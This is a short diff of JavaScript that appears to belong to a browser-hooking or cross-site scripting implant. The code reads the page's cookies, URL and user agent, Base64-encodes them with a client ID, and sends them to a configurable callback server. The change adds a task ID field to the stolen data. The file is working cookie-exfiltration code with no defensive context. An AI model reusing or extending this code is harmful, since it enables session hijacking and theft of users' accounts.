@@ -7,13 +7,14 @@ function makeclientid(length) {
     }
     return result;
  }
-function sendDataBack(data)
+function sendDataBack(data,taskid)
 {
     url=this.jscallback
     data={'dataupload':data}
     data['clientbasicinfo']={}
     data['clientbasicinfo']['jsurl']=this.jsurl
     data['clientbasicinfo']['clientid']=this.clientid
+    data['clientbasicinfo']['taskid']=this.taskid
 
     data=Base64.encode(JSON.stringify(data))
     var retval='shit'
@@ -53,7 +54,7 @@ function main()
         cururl=location.href
         useragent=navigator.userAgent
         data={'curdomaincookies':document.cookie,'cururl':cururl,'useragent':useragent}
-        sendDataBack(data)
+        resultjs=sendDataBack(data)
     }
     else
         this.clientid=cookie
